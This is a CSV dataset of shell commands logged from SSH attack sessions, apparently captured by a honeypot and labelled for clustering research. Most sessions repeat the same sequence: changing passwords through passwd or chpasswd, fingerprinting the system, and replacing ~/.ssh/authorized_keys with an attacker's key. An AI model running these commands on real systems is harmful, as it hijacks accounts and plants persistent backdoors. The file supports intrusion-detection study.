,session,command_freq,input,attack_cat,label_nr,label_desc,duration,SeededKmeans_result,Kmeans_results,PCKmeans_exp_result
11992,bb76b77c0b65,18,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,7.006411552429199,1,2,3
11993,bb76b77c0b65,18,"echo -e ""admin123\nLYyOe0WxPFvh\nLYyOe0WxPFvh""|passwd|bash",Malicious activity,1,SSH attack,7.006411552429199,1,2,3
11994,bb76b77c0b65,18,Enter new UNIX password: ,Malicious activity,1,SSH attack,7.006411552429199,1,2,3
11995,bb76b77c0b65,18,Enter new UNIX password:,Malicious activity,1,SSH attack,7.006411552429199,1,2,3
11996,bb76b77c0b65,18,"echo ""admin123\nLYyOe0WxPFvh\nLYyOe0WxPFvh\n""|passwd",Malicious activity,1,SSH attack,7.006411552429199,1,2,3
11997,bb76b77c0b65,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,7.006411552429199,1,2,3
11998,bb76b77c0b65,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,7.006411552429199,1,2,3
11999,bb76b77c0b65,18,ls -lh $(which ls),Malicious activity,1,SSH attack,7.006411552429199,1,2,3
12000,bb76b77c0b65,18,which ls,Malicious activity,1,SSH attack,7.006411552429199,1,2,3
12001,bb76b77c0b65,18,crontab -l,Malicious activity,1,SSH attack,7.006411552429199,1,2,3
12002,bb76b77c0b65,18,w,Malicious activity,1,SSH attack,7.006411552429199,1,2,3
12003,bb76b77c0b65,18,uname -m,Malicious activity,1,SSH attack,7.006411552429199,1,2,3
12004,bb76b77c0b65,18,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,7.006411552429199,1,2,3
12005,bb76b77c0b65,18,top,Malicious activity,1,SSH attack,7.006411552429199,1,2,3
12006,bb76b77c0b65,18,uname,Malicious activity,1,SSH attack,7.006411552429199,1,2,3
12007,bb76b77c0b65,18,uname -a,Malicious activity,1,SSH attack,7.006411552429199,1,2,3
12008,bb76b77c0b65,18,lscpu | grep Model,Malicious activity,1,SSH attack,7.006411552429199,1,2,3
12009,bb76b77c0b65,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,7.006411552429199,1,2,3
12010,0a549af8e24d,15,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,7.010514974594116,1,2,3
12011,0a549af8e24d,15,"echo ""root:5yX99aFLGQNo""|chpasswd|bash",Malicious activity,1,SSH attack,7.010514974594116,1,2,3
12012,0a549af8e24d,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,7.010514974594116,1,2,3
12013,0a549af8e24d,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,7.010514974594116,1,2,3
12014,0a549af8e24d,15,ls -lh $(which ls),Malicious activity,1,SSH attack,7.010514974594116,1,2,3
12015,0a549af8e24d,15,which ls,Malicious activity,1,SSH attack,7.010514974594116,1,2,3
12016,0a549af8e24d,15,crontab -l,Malicious activity,1,SSH attack,7.010514974594116,1,2,3
12017,0a549af8e24d,15,w,Malicious activity,1,SSH attack,7.010514974594116,1,2,3
12018,0a549af8e24d,15,uname -m,Malicious activity,1,SSH attack,7.010514974594116,1,2,3
12019,0a549af8e24d,15,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,7.010514974594116,1,2,3
12020,0a549af8e24d,15,top,Malicious activity,1,SSH attack,7.010514974594116,1,2,3
12021,0a549af8e24d,15,uname,Malicious activity,1,SSH attack,7.010514974594116,1,2,3
12022,0a549af8e24d,15,uname -a,Malicious activity,1,SSH attack,7.010514974594116,1,2,3
12023,0a549af8e24d,15,lscpu | grep Model,Malicious activity,1,SSH attack,7.010514974594116,1,2,3
12024,0a549af8e24d,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,7.010514974594116,1,2,3
12025,5d78d35a5aec,18,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,70.27967572212219,1,2,3
12026,5d78d35a5aec,18,"echo -e ""pew\nwyDfvo6s54Z8\nwyDfvo6s54Z8""|passwd|bash",Malicious activity,1,SSH attack,70.27967572212219,1,2,3
12027,5d78d35a5aec,18,Enter new UNIX password: ,Malicious activity,1,SSH attack,70.27967572212219,1,2,3
12028,5d78d35a5aec,18,Enter new UNIX password:,Malicious activity,1,SSH attack,70.27967572212219,1,2,3
12029,5d78d35a5aec,18,"echo ""pew\nwyDfvo6s54Z8\nwyDfvo6s54Z8\n""|passwd",Malicious activity,1,SSH attack,70.27967572212219,1,2,3
12030,5d78d35a5aec,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,70.27967572212219,1,2,3
12031,5d78d35a5aec,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,70.27967572212219,1,2,3
12032,5d78d35a5aec,18,ls -lh $(which ls),Malicious activity,1,SSH attack,70.27967572212219,1,2,3
12033,5d78d35a5aec,18,which ls,Malicious activity,1,SSH attack,70.27967572212219,1,2,3
12034,5d78d35a5aec,18,crontab -l,Malicious activity,1,SSH attack,70.27967572212219,1,2,3
12035,5d78d35a5aec,18,w,Malicious activity,1,SSH attack,70.27967572212219,1,2,3
12036,5d78d35a5aec,18,uname -m,Malicious activity,1,SSH attack,70.27967572212219,1,2,3
12037,5d78d35a5aec,18,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,70.27967572212219,1,2,3
12038,5d78d35a5aec,18,top,Malicious activity,1,SSH attack,70.27967572212219,1,2,3
12039,5d78d35a5aec,18,uname,Malicious activity,1,SSH attack,70.27967572212219,1,2,3
12040,5d78d35a5aec,18,uname -a,Malicious activity,1,SSH attack,70.27967572212219,1,2,3
12041,5d78d35a5aec,18,lscpu | grep Model,Malicious activity,1,SSH attack,70.27967572212219,1,2,3
12042,5d78d35a5aec,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,70.27967572212219,1,2,3
12043,36694c8eefc6,18,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,7.030032634735107,1,2,3
12044,36694c8eefc6,18,"echo -e ""nde\nlJU9iTng3YUu\nlJU9iTng3YUu""|passwd|bash",Malicious activity,1,SSH attack,7.030032634735107,1,2,3
12045,36694c8eefc6,18,Enter new UNIX password: ,Malicious activity,1,SSH attack,7.030032634735107,1,2,3
12046,36694c8eefc6,18,Enter new UNIX password:,Malicious activity,1,SSH attack,7.030032634735107,1,2,3
12047,36694c8eefc6,18,"echo ""nde\nlJU9iTng3YUu\nlJU9iTng3YUu\n""|passwd",Malicious activity,1,SSH attack,7.030032634735107,1,2,3
12048,36694c8eefc6,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,7.030032634735107,1,2,3
12049,36694c8eefc6,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,7.030032634735107,1,2,3
12050,36694c8eefc6,18,ls -lh $(which ls),Malicious activity,1,SSH attack,7.030032634735107,1,2,3
12051,36694c8eefc6,18,which ls,Malicious activity,1,SSH attack,7.030032634735107,1,2,3
12052,36694c8eefc6,18,crontab -l,Malicious activity,1,SSH attack,7.030032634735107,1,2,3
12053,36694c8eefc6,18,w,Malicious activity,1,SSH attack,7.030032634735107,1,2,3
12054,36694c8eefc6,18,uname -m,Malicious activity,1,SSH attack,7.030032634735107,1,2,3
12055,36694c8eefc6,18,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,7.030032634735107,1,2,3
12056,36694c8eefc6,18,top,Malicious activity,1,SSH attack,7.030032634735107,1,2,3
12057,36694c8eefc6,18,uname,Malicious activity,1,SSH attack,7.030032634735107,1,2,3
12058,36694c8eefc6,18,uname -a,Malicious activity,1,SSH attack,7.030032634735107,1,2,3
12059,36694c8eefc6,18,lscpu | grep Model,Malicious activity,1,SSH attack,7.030032634735107,1,2,3
12060,36694c8eefc6,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,7.030032634735107,1,2,3
12061,1dcac7ca5f82,18,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,7.042239189147949,1,2,3
12062,1dcac7ca5f82,18,"echo -e ""jrb\nSTFEXRZxpL00\nSTFEXRZxpL00""|passwd|bash",Malicious activity,1,SSH attack,7.042239189147949,1,2,3
12063,1dcac7ca5f82,18,Enter new UNIX password: ,Malicious activity,1,SSH attack,7.042239189147949,1,2,3
12064,1dcac7ca5f82,18,Enter new UNIX password:,Malicious activity,1,SSH attack,7.042239189147949,1,2,3
12065,1dcac7ca5f82,18,"echo ""jrb\nSTFEXRZxpL00\nSTFEXRZxpL00\n""|passwd",Malicious activity,1,SSH attack,7.042239189147949,1,2,3
12066,1dcac7ca5f82,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,7.042239189147949,1,2,3
12067,1dcac7ca5f82,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,7.042239189147949,1,2,3
12068,1dcac7ca5f82,18,ls -lh $(which ls),Malicious activity,1,SSH attack,7.042239189147949,1,2,3
12069,1dcac7ca5f82,18,which ls,Malicious activity,1,SSH attack,7.042239189147949,1,2,3
12070,1dcac7ca5f82,18,crontab -l,Malicious activity,1,SSH attack,7.042239189147949,1,2,3
12071,1dcac7ca5f82,18,w,Malicious activity,1,SSH attack,7.042239189147949,1,2,3
12072,1dcac7ca5f82,18,uname -m,Malicious activity,1,SSH attack,7.042239189147949,1,2,3
12073,1dcac7ca5f82,18,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,7.042239189147949,1,2,3
12074,1dcac7ca5f82,18,top,Malicious activity,1,SSH attack,7.042239189147949,1,2,3
12075,1dcac7ca5f82,18,uname,Malicious activity,1,SSH attack,7.042239189147949,1,2,3
12076,1dcac7ca5f82,18,uname -a,Malicious activity,1,SSH attack,7.042239189147949,1,2,3
12077,1dcac7ca5f82,18,lscpu | grep Model,Malicious activity,1,SSH attack,7.042239189147949,1,2,3
12078,1dcac7ca5f82,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,7.042239189147949,1,2,3
12079,c121747b3b1b,15,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,70.44216132164001,1,2,3
12080,c121747b3b1b,15,"echo ""root:rXok7Jvvv040""|chpasswd|bash",Malicious activity,1,SSH attack,70.44216132164001,1,2,3
12081,c121747b3b1b,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,70.44216132164001,1,2,3
12082,c121747b3b1b,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,70.44216132164001,1,2,3
12083,c121747b3b1b,15,ls -lh $(which ls),Malicious activity,1,SSH attack,70.44216132164001,1,2,3
12084,c121747b3b1b,15,which ls,Malicious activity,1,SSH attack,70.44216132164001,1,2,3
12085,c121747b3b1b,15,crontab -l,Malicious activity,1,SSH attack,70.44216132164001,1,2,3
12086,c121747b3b1b,15,w,Malicious activity,1,SSH attack,70.44216132164001,1,2,3
12087,c121747b3b1b,15,uname -m,Malicious activity,1,SSH attack,70.44216132164001,1,2,3
12088,c121747b3b1b,15,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,70.44216132164001,1,2,3
12089,c121747b3b1b,15,top,Malicious activity,1,SSH attack,70.44216132164001,1,2,3
12090,c121747b3b1b,15,uname,Malicious activity,1,SSH attack,70.44216132164001,1,2,3
12091,c121747b3b1b,15,uname -a,Malicious activity,1,SSH attack,70.44216132164001,1,2,3
12092,c121747b3b1b,15,lscpu | grep Model,Malicious activity,1,SSH attack,70.44216132164001,1,2,3
12093,c121747b3b1b,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,70.44216132164001,1,2,3
12094,52866122ce9a,18,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,70.48638772964478,1,2,3
12095,52866122ce9a,18,"echo -e ""test\nf4Mga7E0I2SV\nf4Mga7E0I2SV""|passwd|bash",Malicious activity,1,SSH attack,70.48638772964478,1,2,3
12096,52866122ce9a,18,Enter new UNIX password: ,Malicious activity,1,SSH attack,70.48638772964478,1,2,3
12097,52866122ce9a,18,Enter new UNIX password:,Malicious activity,1,SSH attack,70.48638772964478,1,2,3
12098,52866122ce9a,18,"echo ""test\nf4Mga7E0I2SV\nf4Mga7E0I2SV\n""|passwd",Malicious activity,1,SSH attack,70.48638772964478,1,2,3
12099,52866122ce9a,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,70.48638772964478,1,2,3
12100,52866122ce9a,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,70.48638772964478,1,2,3
12101,52866122ce9a,18,ls -lh $(which ls),Malicious activity,1,SSH attack,70.48638772964478,1,2,3
12102,52866122ce9a,18,which ls,Malicious activity,1,SSH attack,70.48638772964478,1,2,3
12103,52866122ce9a,18,crontab -l,Malicious activity,1,SSH attack,70.48638772964478,1,2,3
12104,52866122ce9a,18,w,Malicious activity,1,SSH attack,70.48638772964478,1,2,3
12105,52866122ce9a,18,uname -m,Malicious activity,1,SSH attack,70.48638772964478,1,2,3
12106,52866122ce9a,18,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,70.48638772964478,1,2,3
12107,52866122ce9a,18,top,Malicious activity,1,SSH attack,70.48638772964478,1,2,3
12108,52866122ce9a,18,uname,Malicious activity,1,SSH attack,70.48638772964478,1,2,3
12109,52866122ce9a,18,uname -a,Malicious activity,1,SSH attack,70.48638772964478,1,2,3
12110,52866122ce9a,18,lscpu | grep Model,Malicious activity,1,SSH attack,70.48638772964478,1,2,3
12111,52866122ce9a,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,70.48638772964478,1,2,3
12112,4e9648bba14a,18,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,70.83246374130249,1,2,3
12113,4e9648bba14a,18,"echo -e ""liuyang\npXhSdhrU8I2V\npXhSdhrU8I2V""|passwd|bash",Malicious activity,1,SSH attack,70.83246374130249,1,2,3
12114,4e9648bba14a,18,Enter new UNIX password: ,Malicious activity,1,SSH attack,70.83246374130249,1,2,3
12115,4e9648bba14a,18,Enter new UNIX password:,Malicious activity,1,SSH attack,70.83246374130249,1,2,3
12116,4e9648bba14a,18,"echo ""liuyang\npXhSdhrU8I2V\npXhSdhrU8I2V\n""|passwd",Malicious activity,1,SSH attack,70.83246374130249,1,2,3
12117,4e9648bba14a,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,70.83246374130249,1,2,3
12118,4e9648bba14a,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,70.83246374130249,1,2,3
12119,4e9648bba14a,18,ls -lh $(which ls),Malicious activity,1,SSH attack,70.83246374130249,1,2,3
12120,4e9648bba14a,18,which ls,Malicious activity,1,SSH attack,70.83246374130249,1,2,3
12121,4e9648bba14a,18,crontab -l,Malicious activity,1,SSH attack,70.83246374130249,1,2,3
12122,4e9648bba14a,18,w,Malicious activity,1,SSH attack,70.83246374130249,1,2,3
12123,4e9648bba14a,18,uname -m,Malicious activity,1,SSH attack,70.83246374130249,1,2,3
12124,4e9648bba14a,18,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,70.83246374130249,1,2,3
12125,4e9648bba14a,18,top,Malicious activity,1,SSH attack,70.83246374130249,1,2,3
12126,4e9648bba14a,18,uname,Malicious activity,1,SSH attack,70.83246374130249,1,2,3
12127,4e9648bba14a,18,uname -a,Malicious activity,1,SSH attack,70.83246374130249,1,2,3
12128,4e9648bba14a,18,lscpu | grep Model,Malicious activity,1,SSH attack,70.83246374130249,1,2,3
12129,4e9648bba14a,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,70.83246374130249,1,2,3
12130,544e86d67469,18,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,7.085458993911743,1,2,3
12131,544e86d67469,18,"echo -e ""kq123\nq40AEu5y7j3O\nq40AEu5y7j3O""|passwd|bash",Malicious activity,1,SSH attack,7.085458993911743,1,2,3
12132,544e86d67469,18,Enter new UNIX password: ,Malicious activity,1,SSH attack,7.085458993911743,1,2,3
12133,544e86d67469,18,Enter new UNIX password:,Malicious activity,1,SSH attack,7.085458993911743,1,2,3
12134,544e86d67469,18,"echo ""kq123\nq40AEu5y7j3O\nq40AEu5y7j3O\n""|passwd",Malicious activity,1,SSH attack,7.085458993911743,1,2,3
12135,544e86d67469,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,7.085458993911743,1,2,3
12136,544e86d67469,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,7.085458993911743,1,2,3
12137,544e86d67469,18,ls -lh $(which ls),Malicious activity,1,SSH attack,7.085458993911743,1,2,3
12138,544e86d67469,18,which ls,Malicious activity,1,SSH attack,7.085458993911743,1,2,3
12139,544e86d67469,18,crontab -l,Malicious activity,1,SSH attack,7.085458993911743,1,2,3
12140,544e86d67469,18,w,Malicious activity,1,SSH attack,7.085458993911743,1,2,3
12141,544e86d67469,18,uname -m,Malicious activity,1,SSH attack,7.085458993911743,1,2,3
12142,544e86d67469,18,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,7.085458993911743,1,2,3
12143,544e86d67469,18,top,Malicious activity,1,SSH attack,7.085458993911743,1,2,3
12144,544e86d67469,18,uname,Malicious activity,1,SSH attack,7.085458993911743,1,2,3
12145,544e86d67469,18,uname -a,Malicious activity,1,SSH attack,7.085458993911743,1,2,3
12146,544e86d67469,18,lscpu | grep Model,Malicious activity,1,SSH attack,7.085458993911743,1,2,3
12147,544e86d67469,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,7.085458993911743,1,2,3
12148,6a5e51331e18,18,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,7.106080055236816,1,2,3
12149,6a5e51331e18,18,"echo -e ""gcc\nwgizKg6xZLfZ\nwgizKg6xZLfZ""|passwd|bash",Malicious activity,1,SSH attack,7.106080055236816,1,2,3
12150,6a5e51331e18,18,Enter new UNIX password: ,Malicious activity,1,SSH attack,7.106080055236816,1,2,3
12151,6a5e51331e18,18,Enter new UNIX password:,Malicious activity,1,SSH attack,7.106080055236816,1,2,3
12152,6a5e51331e18,18,"echo ""gcc\nwgizKg6xZLfZ\nwgizKg6xZLfZ\n""|passwd",Malicious activity,1,SSH attack,7.106080055236816,1,2,3
12153,6a5e51331e18,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,7.106080055236816,1,2,3
12154,6a5e51331e18,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,7.106080055236816,1,2,3
12155,6a5e51331e18,18,ls -lh $(which ls),Malicious activity,1,SSH attack,7.106080055236816,1,2,3
12156,6a5e51331e18,18,which ls,Malicious activity,1,SSH attack,7.106080055236816,1,2,3
12157,6a5e51331e18,18,crontab -l,Malicious activity,1,SSH attack,7.106080055236816,1,2,3
12158,6a5e51331e18,18,w,Malicious activity,1,SSH attack,7.106080055236816,1,2,3
12159,6a5e51331e18,18,uname -m,Malicious activity,1,SSH attack,7.106080055236816,1,2,3
